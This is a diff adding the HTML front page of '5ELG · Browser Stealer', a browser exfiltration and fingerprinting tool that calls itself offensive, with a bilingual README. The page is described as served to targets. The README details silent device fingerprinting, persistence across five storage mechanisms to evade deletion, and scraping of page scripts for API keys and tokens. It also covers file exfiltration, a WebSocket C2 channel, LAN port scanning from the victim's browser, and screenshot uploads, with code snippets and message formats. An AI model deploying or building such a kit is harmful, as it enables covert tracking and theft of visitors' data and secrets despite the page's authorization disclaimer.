+    <!-- EXTERNAL ENRICHMENT: GEO + FINGERPRINTJS -->
+    <div class="ext-panels">
+
+        <!-- GEO IP PANEL -->
+        <div class="ext-panel">
+            <div class="ext-head" style="color:var(--blue)">
+                <span>🌍</span> IP Geolocation
+                <span class="api-badge" id="geo-api-badge" style="margin-left:auto">querying<span class="loading-dots"></span></span>
+            </div>
+            <div class="ext-body">
+                <div class="geo-city-line">
+                    <span id="geo-flag"></span>
+                    <span id="geo-city">—</span>
+                </div>
+                <div class="geo-row"><span class="geo-k">Country</span>   <span class="geo-v" id="geo-country">—</span></div>
+                <div class="geo-row"><span class="geo-k">Region</span>    <span class="geo-v dim" id="geo-region">—</span></div>
+                <div class="geo-row"><span class="geo-k">Public IP</span> <span class="geo-v green" id="geo-ip">—</span></div>
+                <div class="geo-row"><span class="geo-k">ISP / Org</span> <span class="geo-v blue" id="geo-isp">—</span></div>
+                <div class="geo-row"><span class="geo-k">ASN</span>       <span class="geo-v dim" id="geo-asn">—</span></div>
+                <div class="geo-row"><span class="geo-k">Timezone</span>  <span class="geo-v dim" id="geo-tz">—</span></div>
+                <div class="geo-row"><span class="geo-k">Lat / Lon</span> <span class="geo-v dim" id="geo-latlon">—</span></div>
+                <div class="geo-row"><span class="geo-k">Proxy</span>    <span class="geo-v" id="geo-proxy">—</span></div>
+                <div class="geo-row"><span class="geo-k">Mobile</span>   <span class="geo-v" id="geo-mobile">—</span></div>
+                <div class="geo-row"><span class="geo-k">Hosting</span>  <span class="geo-v" id="geo-hosting">—</span></div>
+                <div class="geo-row"><span class="geo-k">Source API</span><span class="geo-v dim" id="geo-source">—</span></div>
+            </div>
+        </div>
+
+        <!-- FINGERPRINTJS PANEL -->
+        <div class="ext-panel">
+            <div class="ext-head" style="color:var(--purple)">
+                <span>🔬</span> FingerprintJS v5
+                <span class="api-badge" id="fpjs-badge" style="margin-left:auto">loading<span class="loading-dots"></span></span>
+            </div>
+            <div class="ext-body">
+                <div class="geo-row"><span class="geo-k">Library</span><span class="geo-v dim">FingerprintJS OSS v5</span></div>
+                <div class="geo-row"><span class="geo-k">Method</span> <span class="geo-v dim">50+ browser attributes → MurmurHash3</span></div>
+                <div class="geo-row"><span class="geo-k">Accuracy</span><span class="geo-v amber">~40–60% (client-side only)</span></div>
+                <div class="geo-row"><span class="geo-k">visitorId</span><span class="geo-v" style="flex:1">
+                    <span class="fpjs-id" id="fpjs-id">querying<span class="loading-dots"></span></span>
+                </span></div>
+                <div class="fpjs-cmp">
+                    <div style="font-size:8px;text-transform:uppercase;letter-spacing:.1em;color:var(--dim2);margin-bottom:3px">Hash comparison</div>
+                    <div class="fpjs-cmp-row">
+                        <span class="fpjs-cmp-k">5ELG Fu</span>
+                        <span class="fpjs-cmp-v green" id="cmp-fu">—</span>
+                    </div>
+                    <div class="fpjs-cmp-row">
+                        <span class="fpjs-cmp-k">FPJS id</span>
+                        <span class="fpjs-cmp-v" style="color:var(--purple)" id="cmp-fpjs">—</span>
+                    </div>
+                    <div class="fpjs-cmp-row" style="margin-top:4px">
+                        <span class="fpjs-cmp-k">Match?</span>
+                        <span class="match-badge diff" id="cmp-match">different algorithms</span>
+                    </div>
+                    <div style="font-size:9px;color:var(--dim2);margin-top:6px;line-height:1.6">
+                        5ELG uses SHA256 of a curated set (cookie+font+lang+tz+platform). FingerprintJS uses 50+ entropy sources with MurmurHash3. Both are client-side only — neither requires a server.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div><!-- /ext-panels -->
+
+    <!-- ACTION BAR -->
+    <div class="action-bar">
+        <button class="a-btn green"  onclick="showSrc()">         <span class="dot"></span> SOURCE CODE</button>
+        <button class="a-btn blue"   onclick="showFinger()">       <span class="dot"></span> FINGERPRINT</button>
+        <a      class="a-btn purple" href="/web/dashboard">        <span class="dot"></span> DASHBOARD</a>
+        <button class="a-btn amber"  onclick="copyFu()">           <span class="dot"></span> COPY FU</button>
+        <button class="a-btn red"    onclick="triggerNetScan()">   <span class="dot"></span> NET SCAN</button>
+        <button class="a-btn"        onclick="openStatics()">◈ INTEL PAGE</button>
+    </div>
+
+    <!-- TERMINAL — always visible -->
+    <div class="terminal">
+        <div class="term-head">
+            <div class="term-dots">
+                <div class="term-dot" style="background:#ff5f57"></div>
+                <div class="term-dot" style="background:#ffbd2e"></div>
+                <div class="term-dot" style="background:#28ca41"></div>
+            </div>
+            ACTIVITY LOG — real-time event stream
+            <span style="margin-left:auto;font-size:8px" id="term-count">0 entries</span>
+        </div>
+        <div class="term-body" id="term-body"></div>
+    </div>
+
+    <!-- README — bilingual, EN default -->
+    <div class="readme">
+
+        <!-- lang tabs -->
+        <div class="lang-tabs">
+            <div class="lang-tab active" onclick="switchLang('en',this)">🇬🇧 English</div>
+            <div class="lang-tab" onclick="switchLang('es',this)">🇪🇸 Español</div>
+        </div>
+
+        <!-- ══ ENGLISH ══ -->
+        <div id="lang-en" class="lang-content active">
+
+            <div class="rm-section">
+                <div class="rm-head open" onclick="toggleRm(this)">
+                    <span class="rm-icon">📖</span>
+                    <span class="rm-title">What is 5ELG · Browser Stealer?</span>
+                    <span class="rm-tag" style="color:var(--green);border-color:rgba(95,255,176,.3)">START HERE</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body open">
+                    <p class="rm-p"><b>5ELG</b> (brow<b>5</b>er <b>E</b>xfi<b>L</b>tration and fin<b>G</b>erprinting) is an offensive security tool that demonstrates what any webpage can silently extract from a visitor's browser — <b>no install, no explicit permission</b>.</p>
+                    <p class="rm-p">This page is the <b>"dealer"</b> — the page served to the target. The moment they visit, <code>merch.js</code> runs automatically: it fingerprints the device, crawls the DOM, captures a screenshot and posts everything to the backend in a few hundred milliseconds.</p>
+                    <div class="rm-note">This tool is designed for pentesting and security auditing on systems you own or have explicit written authorization to test. Using it against third parties without consent is illegal.</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🔍</span>
+                    <span class="rm-title">Fingerprinting — How it works</span>
+                    <span class="rm-tag" style="color:var(--blue);border-color:rgba(126,184,255,.3)">TECHNICAL</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">Fingerprinting generates a <b>unique identifier (Fu)</b> by combining hardware and software signals. The result is persisted across all available browser storage mechanisms to survive cookie deletion.</p>
+                    <div class="rm-grid">
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--green)">Fu — Fingerprint Unique ID</div>
+                            <div class="rm-card-body">SHA256 hash of: <code>cookieEnabled</code> + <code>fontSize</code> + normalized <code>language</code> + <code>timezone</code> + <code>platform</code>. The primary cross-session identifier.</div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--blue)">Fb — Browser Fingerprint</div>
+                            <div class="rm-card-body">SHA256 derived from Fu. Represents the browser profile fingerprint. Changes with a different browser but stable within the same profile.</div>
+                        </div>
+                    </div>
+                    <ul class="rm-list">
+                        <li><b>Canvas API:</b> Renders text and shapes — GPU/font/driver differences produce unique per-device pixel data.</li>
+                        <li><b>WebGL Renderer:</b> <code>gl.getParameter(gl.RENDERER)</code> exposes the exact GPU model and OpenGL driver string.</li>
+                        <li><b>Battery API:</b> <code>navigator.getBattery()</code> returns charge level, charging state and time estimates — a passive cross-site tracking vector.</li>
+                        <li><b>WebRTC IP Leak:</b> <code>RTCPeerConnection</code> ICE candidates expose the LAN IP even behind some VPNs.</li>
+                        <li><b>Network API:</b> <code>navigator.connection</code> leaks <code>effectiveType</code>, <code>downlink</code> and <code>rtt</code> — ISP and location inference.</li>
+                        <li><b>Media Devices:</b> <code>enumerateDevices()</code> lists cameras and microphones by ID and label — no permission required.</li>
+                        <li><b>DeviceMemory / hardwareConcurrency:</b> RAM and CPU cores identify the device class with high precision.</li>
+                        <li><b>Permissions API:</b> Queries status of 10 permissions (camera, mic, geo…) without triggering any dialog.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">💾</span>
+                    <span class="rm-title">Multi-layer Persistence — Storage Evasion</span>
+                    <span class="rm-tag" style="color:var(--purple);border-color:rgba(196,176,255,.3)">EVASION</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">The Fu is stored <b>simultaneously in 5 different mechanisms</b>. If the user clears cookies, the identifier is recovered from IndexedDB or Cache API. This makes it very hard to remove without a full browser reset.</p>
+                    <ul class="rm-list">
+                        <li><b>LocalStorage:</b> Persists across sessions. User can clear it manually from DevTools.</li>
+                        <li><b>SessionStorage:</b> Lasts only the session, but acts as an immediate fallback.</li>
+                        <li><b>Cookies:</b> Path=/ SameSite=Strict. Auto-sent on every request to the same domain.</li>
+                        <li><b>Cache API:</b> <code>caches.open('5elg-cache')</code> — stored in the SW cache layer, survives cookie deletion.</li>
+                        <li><b>IndexedDB:</b> Browser database — survives history clearing in most browsers.</li>
+                    </ul>
+                    <div class="rm-code">// Recovery cascade — first hit wins:
+1. localStorage.getItem('u')
+2. sessionStorage.getItem('u')
+3. document.cookie → parse 'u='
+4. caches.open('5elg-cache').match('u')
+5. indexedDB → open('5elg-db') → store.get('u')</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🕵️</span>
+                    <span class="rm-title">Script Intel — JS source analysis for secrets</span>
+                    <span class="rm-tag" style="color:var(--amber);border-color:rgba(255,208,112,.3)">INTEL</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">The stealer fetches and parses <b>every JS script</b> referenced on the page (plus inline scripts) looking for sensitive data accidentally hardcoded.</p>
+                    <div class="rm-grid">
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--amber)">Patterns searched</div>
+                            <div class="rm-card-body">
+                                <code>Emails</code> — RFC5322 regex<br>
+                                <code>JWT tokens</code> — eyJ*.eyJ*.* + header validation<br>
+                                <code>Google API</code> — AIza[35 chars]<br>
+                                <code>AWS Access Key</code> — AKIA[16 chars]<br>
+                                <code>Firebase</code> — AAAA...[147 chars]<br>
+                                <code>GitHub token</code> — ghp_[36 chars]<br>
+                                <code>Slack token</code> — xox[baprs]-...
+                            </div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--purple)">Route extraction</div>
+                            <div class="rm-card-body">
+                                URLs extracted from: <code>&lt;a href&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;script src&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, CSS <code>url()</code> and body text.<br><br>
+                                Classified as: <b>JS files</b> (analyzable), <b>endpoints</b> (no extension), <b>others</b> (exfiltrable).
+                            </div>
+                        </div>
+                    </div>
+                    <p class="rm-p">Results are sent via WebSocket on the <code>inteldata</code> channel and also included in the initial HTTP POST payload under the <code>intel</code> field.</p>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">📂</span>
+                    <span class="rm-title">File Exfiltration — Browser-based file theft</span>
+                    <span class="rm-tag" style="color:var(--red);border-color:rgba(255,128,128,.3)">EXFIL</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">For each resource in the <b>"others"</b> category (PDFs, images, static files), the stealer downloads them as <code>ArrayBuffer</code>, encodes to base64 and uploads to the server.</p>
+                    <div class="rm-code">// Exfiltration flow:
+1. extractRoutes() → result.others
+2. makeFileRequest(url) → XHR arraybuffer → base64
+3. uploadFile(Fu, filename, base64)
+   → POST multipart → /upload/file?ID={Fu}
+   → FormData with typed Blob (application/octet-stream)</div>
+                    <div class="rm-note">Only works for files accessible without CORS restrictions. Files requiring auth or blocked by CORS are silently skipped.</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🔌</span>
+                    <span class="rm-title">WebSocket — Persistent bidirectional C2 channel</span>
+                    <span class="rm-tag" style="color:var(--blue);border-color:rgba(126,184,255,.3)">C2</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">After resolving the Fu, the stealer opens a persistent <code>WebSocket</code> to the 5ELG server for real-time data exfiltration and command reception.</p>
+                    <div class="rm-code">// Connection:
+wss://{host}/?u={Fu}&b={Fb}
+
+// Messages emitted:
+{ route: "pwdata",    data: { Fu, c: { links, jsFiles, other } } }
+{ route: "inteldata", data: { Fu, c: [ { file, emails, jwtTokens, apiKs } ] } }
+{ route: "netdata",   data: { Fu, c: { "192.168.1.1": { 80: "open" } } } }</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🌐</span>
+                    <span class="rm-title">Network Scanner — LAN service discovery</span>
+                    <span class="rm-tag" style="color:var(--purple);border-color:rgba(196,176,255,.3)">NETWORK</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">Using <code>fetch()</code> in <code>no-cors</code> mode, the stealer detects open HTTP/HTTPS ports on private network IPs from inside the target's browser — no server-side CORS required.</p>
+                    <ul class="rm-list">
+                        <li><b>Ranges scanned:</b> 192.168.0.x, 192.168.1.x, 10.0.0.x, 10.0.1.x, 172.16.0.x, 172.16.1.x (50 hosts per range).</li>
+                        <li><b>Ports:</b> 80, 443, 8080, 8443 per IP.</li>
+                        <li><b>Technique:</b> If <code>fetch()</code> throws NetworkError → closed. If it returns (even opaque response) → open.</li>
+                        <li><b>Results:</b> Sent in real-time via WebSocket <code>netdata</code> channel and logged in the Activity Log.</li>
+                    </ul>
+                    <div class="rm-note">Only detects HTTP/HTTPS services. SSH, SMTP, FTP etc. are not detectable this way from the browser.</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">📤</span>
+                    <span class="rm-title">HTTP Payload — Screenshot + HTML + Fingerprint POST</span>
+                    <span class="rm-tag" style="color:var(--green);border-color:rgba(95,255,176,.3)">POST</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">Alongside the WebSocket, a full <b>HTTP POST</b> is sent to <code>/dealer</code> including a complete page screenshot via <code>html2canvas</code>.</p>
+                    <div class="rm-code">// POST fields (application/x-www-form-urlencoded):
+u     → Fu (user fingerprint)
+b     → Fb (browser hash)
+r     → Request hash SHA256 with timestamp
+Ua    → navigator.userAgent (full)
+data  → btoa(JSON.stringify(extendedFingerprintData))
+code  → btoa(encodeURIComponent(outerHTML))   ← full page HTML
+s     → encodeURIComponent(base64_screenshot) ← PNG capture
+ts    → ISO timestamp</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🚫</span>
+                    <span class="rm-title">NoScript Fallback — CSS tracking without JavaScript</span>
+                    <span class="rm-tag" style="color:var(--amber);border-color:rgba(255,208,112,.3)">CSS</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">If JS is disabled (NoScript, Tor Browser), the <code>&lt;noscript&gt;</code> block activates passive CSS-only tracking techniques:</p>
+                    <ul class="rm-list">
+                        <li><b>IMG Ping:</b> A real <code>&lt;img&gt;</code> that fires a GET to the server, logging the visitor's IP without any JS.</li>
+                        <li><b>CSS @font-face:</b> Declares system fonts (Ubuntu→Linux, Calibri→Windows). If the font exists locally, the browser skips the URL request. If not, it fetches — server logs the OS fingerprint.</li>
+                        <li><b>CSS @supports:</b> Different render engines support different properties. <code>-webkit-app-region</code>→Chrome. <code>-moz-appearance</code>→Firefox. <code>-apple-pay-button-style</code>→Safari. Detects browser without JS.</li>
+                    </ul>
+                    <div class="rm-code">// Example: detect Firefox without JS
+@supports(-moz-appearance: inherit) {
+    .bs { background: url('/dealer/kid.png?u=cssTracking(Firefox)&b=NOSCRIPT') }
+}
+// If Firefox → browser applies style → makes GET → backend logs it.</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🗺️</span>
+                    <span class="rm-title">Full execution timeline</span>
+                    <span class="rm-tag" style="color:var(--text);border-color:rgba(255,255,255,.2)">OVERVIEW</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <div class="rm-code">t=0ms    → Page loaded, script executes
+t=1ms    → getFingerprintDataExtended() — synchronous data collection
+t=2ms    → getDataFromAllStorages('u') — checks 5 storage mechanisms
+t=~5ms   → If no Fu → generateUserBrowserFingerprint() → SHA256
+t=~6ms   → storeDataInAllStorages('u', Fu) — persists to all 5 storages
+t=~8ms   → connectWebSocket(wss://host/?u=Fu&b=Fb)
+t=~10ms  → html2canvas(document.body) — screenshot (slow operation)
+t=async  → navigator.getBattery() → battery state
+t=async  → navigator.mediaDevices.enumerateDevices() → device list
+t=async  → RTCPeerConnection ICE → local IP leak
+t=WS open → sendLinksAndScriptsToWebSocket()
+            → extractRoutes(document) → jsFiles, endpoints, others
+            → socket.send({route:'pwdata', ...})
+            → stealFile(Fu, uri) for each "other"
+            → analyzeJavaScriptFiles(jsFiles)
+              → fetch(script) → findEmails/JWT/APIkeys
+              → socket.send({route:'inteldata', ...})
+t=done   → POST /dealer with full payload + screenshot</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🖥️</span>
+                    <span class="rm-title">5ELG Backend — What happens with the data</span>
+                    <span class="rm-tag" style="color:var(--blue);border-color:rgba(126,184,255,.3)">BACKEND</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">The 5ELG backend (Node.js + Express + Sequelize/SQLite) receives and stores data in several tables:</p>
+                    <ul class="rm-list">
+                        <li><b>Log table:</b> Every request to <code>/dealer</code> creates a row with Fu, Fb, Ua, IP, Ts, Dl, Ed (extended data b64), Er (request info b64), Jd (device JSON), screenshot, full HTML.</li>
+                        <li><b>Finger table:</b> Groups by Fu. Stores INTEL, PWD, FB, IPS across all sessions of the same user.</li>
+                        <li><b>Files:</b> Exfiltrated files saved server-side with Fu as <code>origin</code>.</li>
+                        <li><b>WebSocket:</b> <code>pwdata</code>, <code>inteldata</code> and <code>netdata</code> messages are processed and stored in real-time.</li>
+                    </ul>
+                    <div class="rm-code">// Dashboard URLs:
+/web/dashboard              → all fingerprints table
+/web/statics?finger={Fu}   → full analysis for a specific Fu
+/web/files                  → exfiltrated files
+/web/scanners               → IP intelligence dashboard</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🌐</span>
+                    <span class="rm-title">External APIs &amp; Third-party Libraries</span>
+                    <span class="rm-tag" style="color:var(--amber);border-color:rgba(255,208,112,.3)">ENRICHMENT</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">In addition to the local fingerprint, 5ELG enriches each session with data from three free external geo APIs (cascade fallback) and the open-source FingerprintJS library — all client-side, no API key required.</p>
+                    <div class="rm-grid">
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--blue)">🌍 ipwho.is (primary)</div>
+                            <div class="rm-card-body">
+                                HTTPS + CORS open. No key, no signup. Returns: IP, city, country, ISP, ASN, timezone, lat/lon. Fast and reliable for most regions.<br><br>
+                                <code>GET https://ipwho.is/</code>
+                            </div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--green)">📍 ip-api.com (fallback 1)</div>
+                            <div class="rm-card-body">
+                                HTTP only (HTTPS is paid). No key. 45 req/min. Returns proxy/VPN detection, mobile flag, hosting detection — very useful for risk assessment.<br><br>
+                                <code>GET http://ip-api.com/json/?fields=...</code>
+                            </div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--purple)">☁ BigDataCloud (fallback 2)</div>
+                            <div class="rm-card-body">
+                                HTTPS, no key, edge-deployed. Client-side only endpoint. Returns ISP, ASN, network type. Designed for browser use, GDPR-compliant.<br><br>
+                                <code>GET https://api.bigdatacloud.net/data/client-info</code>
+                            </div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--purple)">🔬 FingerprintJS v5 OSS</div>
+                            <div class="rm-card-body">
+                                Open-source browser fingerprinting library by Fingerprint Inc. Queries 50+ browser attributes and produces a <code>visitorId</code> via MurmurHash3. ~40–60% accuracy (client-side only). Loaded via CDN — blocked by some ad blockers.<br><br>
+                                <code>import 'https://openfpcdn.io/fingerprintjs/v5/iife.min.js'</code>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="rm-p">The <b>geo cascade</b> tries APIs in order — if ipwho.is fails (e.g. blocked), it falls back to ip-api.com (HTTP), then BigDataCloud. The geo badge in the panel shows which API succeeded. The <code>fpjs</code> field is included in the POST payload alongside the 5ELG <code>Fu</code> for server-side comparison.</p>
+                    <div class="rm-note">ip-api.com uses HTTP (not HTTPS) for the free tier. In HTTPS contexts some browsers may block mixed-content requests — in that case BigDataCloud (HTTPS) is used instead.</div>
+                </div>
+            </div>
+
+        </div><!-- /lang-en -->
+
+        <!-- ══ ESPAÑOL ══ -->
+        <div id="lang-es" class="lang-content">
+
+            <div class="rm-section">
+                <div class="rm-head open" onclick="toggleRm(this)">
+                    <span class="rm-icon">📖</span>
+                    <span class="rm-title">¿Qué es 5ELG · Browser Stealer?</span>
+                    <span class="rm-tag" style="color:var(--green);border-color:rgba(95,255,176,.3)">EMPIEZA AQUÍ</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body open">
+                    <p class="rm-p"><b>5ELG</b> (brow<b>5</b>er <b>E</b>xfi<b>L</b>tration and fin<b>G</b>erprinting) es una herramienta de seguridad ofensiva que demuestra lo que cualquier página web puede extraer silenciosamente del navegador de un visitante — <b>sin instalar nada y sin permisos explícitos</b>.</p>
+                    <p class="rm-p">Esta página es el <b>"dealer"</b> — la página que se sirve al target. En el momento en que la visitan, <code>merch.js</code> se ejecuta automáticamente: genera la huella del dispositivo, recorre el DOM, captura una pantalla y lo envía todo al backend en unos cientos de milisegundos.</p>
+                    <div class="rm-note">Esta herramienta está diseñada para pentesting y auditoría de seguridad en sistemas propios o con autorización escrita expresa. Usarla contra terceros sin consentimiento es ilegal.</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🔍</span>
+                    <span class="rm-title">Fingerprinting — Cómo funciona</span>
+                    <span class="rm-tag" style="color:var(--blue);border-color:rgba(126,184,255,.3)">TÉCNICO</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">El fingerprinting genera un <b>identificador único (Fu)</b> combinando señales de hardware y software. El resultado se persiste en todos los mecanismos de almacenamiento disponibles para sobrevivir al borrado de cookies.</p>
+                    <div class="rm-grid">
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--green)">Fu — Fingerprint Unique ID</div>
+                            <div class="rm-card-body">Hash SHA256 de: <code>cookieEnabled</code> + <code>fontSize</code> + <code>language</code> normalizado + <code>timezone</code> + <code>platform</code>. Es el identificador principal del usuario entre sesiones.</div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--blue)">Fb — Browser Fingerprint</div>
+                            <div class="rm-card-body">SHA256 derivado del Fu. Representa la huella del navegador. Cambia con un browser distinto pero es estable dentro del mismo perfil.</div>
+                        </div>
+                    </div>
+                    <ul class="rm-list">
+                        <li><b>Canvas API:</b> Renderiza texto y formas — las diferencias GPU/fuentes producen datos de píxeles únicos por dispositivo.</li>
+                        <li><b>WebGL Renderer:</b> <code>gl.getParameter(gl.RENDERER)</code> expone el modelo exacto de GPU y driver OpenGL.</li>
+                        <li><b>Battery API:</b> <code>navigator.getBattery()</code> devuelve nivel de carga y estado — vector de tracking cross-site pasivo.</li>
+                        <li><b>WebRTC IP Leak:</b> Los ICE candidates de <code>RTCPeerConnection</code> exponen la IP de la LAN incluso detrás de algunas VPN.</li>
+                        <li><b>Network API:</b> <code>navigator.connection</code> filtra <code>effectiveType</code>, <code>downlink</code> y <code>rtt</code> — permite inferir ISP y ubicación.</li>
+                        <li><b>Media Devices:</b> <code>enumerateDevices()</code> lista cámaras y micrófonos por ID y etiqueta sin pedir permiso.</li>
+                        <li><b>DeviceMemory / hardwareConcurrency:</b> RAM y cores de CPU identifican la clase de dispositivo con alta precisión.</li>
+                        <li><b>Permissions API:</b> Consulta el estado de 10 permisos (cámara, micro, geo…) sin activar ningún diálogo.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">💾</span>
+                    <span class="rm-title">Persistencia multi-capa — Evasión de Storage</span>
+                    <span class="rm-tag" style="color:var(--purple);border-color:rgba(196,176,255,.3)">EVASIÓN</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">El Fu se almacena <b>simultáneamente en 5 mecanismos distintos</b>. Si el usuario borra las cookies, el identificador se recupera de IndexedDB o Cache API. Esto hace muy difícil eliminarlo sin un reset completo del navegador.</p>
+                    <ul class="rm-list">
+                        <li><b>LocalStorage:</b> Persiste entre sesiones. El usuario puede borrarlo desde DevTools.</li>
+                        <li><b>SessionStorage:</b> Solo dura la sesión, pero actúa como fallback inmediato.</li>
+                        <li><b>Cookies:</b> Path=/ SameSite=Strict. Se envían automáticamente en cada request al mismo dominio.</li>
+                        <li><b>Cache API:</b> <code>caches.open('5elg-cache')</code> — persiste en la capa de cache, resistente al borrado de cookies.</li>
+                        <li><b>IndexedDB:</b> Base de datos del browser — persiste incluso tras borrar historial en la mayoría de browsers.</li>
+                    </ul>
+                    <div class="rm-code">// Recuperación en cascada — el primero que responda gana:
+1. localStorage.getItem('u')
+2. sessionStorage.getItem('u')
+3. document.cookie → parsear 'u='
+4. caches.open('5elg-cache').match('u')
+5. indexedDB → open('5elg-db') → store.get('u')</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🕵️</span>
+                    <span class="rm-title">Script Intel — Análisis de JS en busca de secretos</span>
+                    <span class="rm-tag" style="color:var(--amber);border-color:rgba(255,208,112,.3)">INTEL</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">El stealer descarga y analiza <b>todos los scripts JS</b> referenciados en la página (y los inline) buscando datos sensibles hardcodeados por error.</p>
+                    <div class="rm-grid">
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--amber)">Patrones buscados</div>
+                            <div class="rm-card-body">
+                                <code>Emails</code> — regex RFC5322<br>
+                                <code>JWT tokens</code> — eyJ*.eyJ*.* + validación de header<br>
+                                <code>Google API Key</code> — AIza[35]<br>
+                                <code>AWS Access Key</code> — AKIA[16]<br>
+                                <code>Firebase</code> — AAAA...[147]<br>
+                                <code>GitHub token</code> — ghp_[36]<br>
+                                <code>Slack token</code> — xox[baprs]-...
+                            </div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--purple)">Extracción de rutas</div>
+                            <div class="rm-card-body">
+                                URLs extraídas de: <code>&lt;a href&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;script src&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, CSS <code>url()</code> y texto del body.<br><br>
+                                Clasificadas como: <b>JS files</b> (analizables), <b>endpoints</b> (sin extensión), <b>others</b> (exfiltrables).
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">📂</span>
+                    <span class="rm-title">Exfiltración de ficheros — Robo vía navegador</span>
+                    <span class="rm-tag" style="color:var(--red);border-color:rgba(255,128,128,.3)">EXFIL</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">Para cada recurso en la categoría <b>"others"</b> (PDFs, imágenes, estáticos), el stealer los descarga como <code>ArrayBuffer</code>, los codifica en base64 y los sube al servidor.</p>
+                    <div class="rm-code">// Flujo de exfiltración:
+1. extractRoutes() → result.others
+2. makeFileRequest(url) → XHR arraybuffer → base64
+3. uploadFile(Fu, filename, base64)
+   → POST multipart → /upload/file?ID={Fu}</div>
+                    <div class="rm-note">Solo funciona para archivos accesibles sin restricciones CORS. Los que requieren auth o tienen CORS bloqueado se omiten silenciosamente.</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🔌</span>
+                    <span class="rm-title">WebSocket — Canal persistente bidireccional C2</span>
+                    <span class="rm-tag" style="color:var(--blue);border-color:rgba(126,184,255,.3)">C2</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">Tras resolver el Fu, el stealer abre una conexión <code>WebSocket</code> permanente al servidor 5ELG para exfiltración en tiempo real y recepción de comandos.</p>
+                    <div class="rm-code">// Conexión:
+wss://{host}/?u={Fu}&b={Fb}
+
+// Mensajes emitidos:
+{ route: "pwdata",    data: { Fu, c: { links, jsFiles, other } } }
